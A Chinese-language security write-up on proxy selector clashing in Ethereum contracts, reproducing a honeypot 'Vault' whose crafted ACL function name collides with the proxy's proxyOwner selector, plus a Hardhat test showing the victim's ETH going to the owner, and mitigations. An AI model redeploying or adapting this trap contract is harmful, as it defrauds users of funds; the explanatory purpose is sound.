[后退](../../README_CN.md)

# 代理合约选择器冲突

**风险名称：** 代理合约选择器冲突 (Proxy selector clashing)

**风险等级：** 高 

**风险描述：**

在以太坊中，调用合约其实是通过合约的ABI来进行的，就会会查找合约中匹配的函数选择器（Selector）并执行相应的逻辑。然而函数选择器只是函数签名哈希值的前8位16进制数字，因此是有可能重复的。那么当一个合约内有两个相同Selector的函数时会怎样？编译器会识别到这一问题并阻止该合约编译。但是如果合约采用了代理/实现这种委托调用模式，而代理合约和实现合约各有一个相同的Selector的函数时呢？此时便会出现调用陷阱，明明是调用实现合约的函数A却会调用代理合约的函数B。因为在代理合约中已经匹配到了函数B，所以不会再去匹配实现合约中的函数A了。`openzeppelin`在编写代理合约时已经意识到了这一点，同时给他们审计的`Nomic`团队也指出了这一点，并给出了利用该冲突的恶意合约。



**示例代码语言：** Solidity

```solidity
/**
 *Submitted for verification at Etherscan.io on 2018-05-11
*/

pragma solidity ^0.4.23;

contract Proxy {
  
    function proxyOwner() public view returns (address);

    function setProxyOwner(address _owner) public returns (address);

    function implementation() public view returns (address);

    function setImplementation(address _implementation) internal returns (address);

    function upgrade(address _implementation) public {
        require(msg.sender == proxyOwner());
        setImplementation(_implementation);
    }

    function () payable public {
        address _impl = implementation();

        assembly {
            calldatacopy(0, 0, calldatasize)
            let result := delegatecall(gas, _impl, 0, calldatasize, 0, 0)
            returndatacopy(0, 0, returndatasize)

            switch result
            case 0 { revert(0, returndatasize) }
            default { return(0, returndatasize) }
        }
    }
}


contract UnstructuredStorageProxy is Proxy {

    bytes32 private constant proxyOwnerSlot = keccak256("proxyOwnerSlot");
    bytes32 private constant implementationSlot = keccak256("implementationSlot");

    constructor(address _implementation) public {
        setAddress(proxyOwnerSlot, msg.sender);
        setImplementation(_implementation);
    }

    function proxyOwner() public view returns (address) {
        return readAddress(proxyOwnerSlot);
    }

    function setProxyOwner(address _owner) public returns (address) {
        require(msg.sender == proxyOwner());
        setAddress(proxyOwnerSlot, _owner);
    }

    function implementation() public view returns (address) {
        return readAddress(implementationSlot);
    }

    function setImplementation(address _implementation) internal returns (address) {
        setAddress(implementationSlot, _implementation);
    }

    function readAddress(bytes32 _slot) internal view returns (address value) {
        bytes32 s = _slot;
        assembly {
            value := sload(s)
        }
    }

    function setAddress(bytes32 _slot, address _address) internal {
        bytes32 s = _slot;
        assembly {
            sstore(s, _address)
        }
    }

}

contract ACL {
    
    address private role5999294130779334338;

    address private role7123909213907581092;

    address private role8972381298910001230;

    function getACLRole5999294130779334338() public view returns (address) {
        return role5999294130779334338;
    }

    function getACLRole8972381298910001230() public view returns (address) {
        return role8972381298910001230;
    }

    function getACLRole7123909213907581092() public view returns (address) {
        return role7123909213907581092;
    }

    function setACLRole7123909213907581092(address _role) public {
        role7123909213907581092 = _role;
    }

    function setACLRole8972381298910001230(address _role) public {
        require(msg.sender == role7123909213907581092);
        role8972381298910001230 = _role;
    }

    function setACLRole5999294130779334338(address _role) public {
        require(msg.sender == role8972381298910001230);
        role5999294130779334338 = _role;
    }
    
}


contract Vault {

    ACL private acl;

    function setACL(ACL _upgradeableAcl) public {
        require(acl == address(0));
        acl = _upgradeableAcl;
    }

    function () public payable {
    }
    
    function balance() public view returns (uint256) {
        return address(this).balance;
    }

    function withdraw() public payable {
        require(balance() > msg.value);
        require(msg.value > balance() - msg.value);
        require(msg.sender == acl.getACLRole8972381298910001230());
        acl.getACLRole5999294130779334338().transfer(balance());
    }
}
```

该合约代码的地址为`https://ropsten.etherscan.io/address/0xb97dd0102bb67f81d25d686c661d7f0aed62e344#code`。

**示例代码简介：**

在上面的代码中，`UnstructuredStorageProxy`为一自定义的代理合约，`ACL`为其实现合约，我们注意到`ACL`合约的几个函数名很奇怪，这是故意而为之的。

`Vault` 合约为一欺诈合约，它的`withdraw()`函数是只要你是acl合约的`role5999294130779334338`并且向合约内转移超过原余额的ETH，你就可以提取合约内所有的ETH。那么怎样才能成为acl合约的`role5999294130779334338`呢？我们可以看到它是一个任意人都可以设置的函数，通过几次设置你可以将该变量设置为任意地址。也就是只要你速度够快并且没有别人插队，那么你就能取走合约内的余额。那么事实真的如此么？

我们来进行相应的单元测试。

**单元测试代码：**

```javascript
const { expect } = require("chai");
const { ethers } = require("hardhat");

describe("Proxy Selector Clashing Demo Unit Test", function () {
    let proxy;
    let vault;
    let owner,user1;
    beforeEach( async function() {
        [owner,user1,] = await ethers.getSigners();

        let ACL = await ethers.getContractFactory("ACL");
        let acl  = await ACL.deploy();
        
        let UnstructuredStorageProxy = await ethers.getContractFactory("UnstructuredStorageProxy");
        let u_proxy = await UnstructuredStorageProxy.deploy(acl.address);

        proxy = ACL.attach(u_proxy.address);

        let Vault = await ethers.getContractFactory("Vault");
        vault = await Vault.deploy();
        await vault.setACL(proxy.address);

        let transaction = {
            to:vault.address,
            value:ethers.utils.parseEther("0.5"),
        }
        await owner.sendTransaction(transaction);
    });

    describe(" withdraw test", function () {
        beforeEach(async () => {
            // 1 set role to user1
            await proxy.connect(user1).setACLRole7123909213907581092(user1.address);
            await proxy.connect(user1).setACLRole8972381298910001230(user1.address);
            await proxy.connect(user1).setACLRole5999294130779334338(user1.address);
        });

        it("user1 withdraw test", async () => {
            // 2 check balance
            let bal_before = await ethers.provider.getBalance(user1.address);
            let bal_vault = await vault.balance();
            expect(bal_vault).to.be.equal(ethers.utils.parseEther("0.5"));
    
            // 3 withdraw
            let sender = await proxy.getACLRole8972381298910001230();
            expect(sender).to.be.equal(user1.address);
            await vault.connect(user1).withdraw({
                value:bal_vault.add(ethers.utils.parseEther("0.1"))
            });
            
            //4 check balance
            let bal_after = await ethers.provider.getBalance(user1.address);
            expect(bal_after.gt(bal_before)).to.be.true;
        });

        it("getACLRole5999294130779334338 test", async () => {
            let getACLRole5999294130779334338 = await proxy.getACLRole5999294130779334338();
            console.log("getACLRole5999294130779334338 is owner:", getACLRole5999294130779334338 === owner.address);
            console.log("getACLRole5999294130779334338 is user1:", getACLRole5999294130779334338 === user1.address);
            let role_bytes32 = await ethers.provider.getStorageAt(proxy.address,0);
            let role5999294130779334338 = ethers.utils.getAddress("0x" + role_bytes32.substring(26));
            console.log("role5999294130779334338 is owner:", role5999294130779334338 === owner.address);
            console.log("role5999294130779334338 is user1:", role5999294130779334338 === user1.address);
        });
    });

    describe("selector value demo", function() {
        it("Same selector", async () => {
            let ACL = await ethers.getContractFactory("ACL");
            let selector1 = ACL.interface.getSighash("getACLRole5999294130779334338");
            console.log("selector1:",selector1);
            let UnstructuredStorageProxy = await ethers.getContractFactory("UnstructuredStorageProxy");  
            let selector2 = UnstructuredStorageProxy.interface.getSighash("proxyOwner");
            console.log("selector2:",selector2);
            console.log("selector1 == selector2:", selector1 === selector2);
        });
    });

});
```

**单元测试结果为：**

```bash
  Proxy Selector Clashing Demo Unit Test
     withdraw test
      1) user1 withdraw test
getACLRole5999294130779334338 is owner: true
getACLRole5999294130779334338 is user1: false
role5999294130779334338 is owner: false
role5999294130779334338 is user1: true
      ✔ getACLRole5999294130779334338 test
    selector value demo
selector1: 0x025313a2
selector2: 0x025313a2
selector1 == selector2: true
      ✔ Same selector


  2 passing (1s)
  1 failing

  1) Proxy Selector Clashing Demo Unit Test
        withdraw test
         user1 withdraw test:

      AssertionError: expected false to be true
      + expected - actual

      -false
      +true
```



**原因分析：**

从上面的测试结果我们可以看到，我们`withdraw`后的余额反而小于提币之前的余额，说明最后的ETH并没有发送给`user1`，而`user1`反而白白付出了额外的ETH（天上并没有掉馅饼）。

而我们明明设置了`role5999294130779334338`为user1啊，为什么呢？

从上面的结果可以看到，虽然`role5999294130779334338`的值为`user`，但是`getACLRole5999294130779334338`函数返回的值却不是`user1`，怪不怪？

还记得我们前面说的函数选择器冲突么和ACL合约的函数名称很怪么？

我们直接看`selector value demo`的测试结果。

```bash
selector1: 0x025313a2
selector2: 0x025313a2
selector1 == selector2: true
```

可以看到`getACLRole5999294130779334338`与`proxyOwner`的函数选择器相同（当然这里的函数名`getACLRole5999294130779334338`是精心计算出来的）。因此当`withdraw`函数中调用`acl.getACLRole5999294130779334338()`的时候，其实是调用的`acl.0x025313a2`。那么，它会首先匹配到`proxyOwner`这个函数，因此不会再去实现合约进行匹配了，也就是它直接返回了`proxyOwner`的值，也就是合约的owner而不是user1，因此ETH最后发送给了这个onwer而不是用户，这就是user1为什么没有收到ETH的原因。



这里其实不能算是BUG，只能算是利用EVM的特性。因此，`openzeppelin`将它们的代理库改为`transparent proxy pattern`限定普通用户只能调用实现合约中的函数。或者采用`UUPS Proxies`模式（该模式下代理合约无法匹配函数）。



我们在开发中采用上面两种模式就可以避免该问题的发生，或者牢记天上不会掉馅饼，这样就不会被这种欺诈合约造成损失。

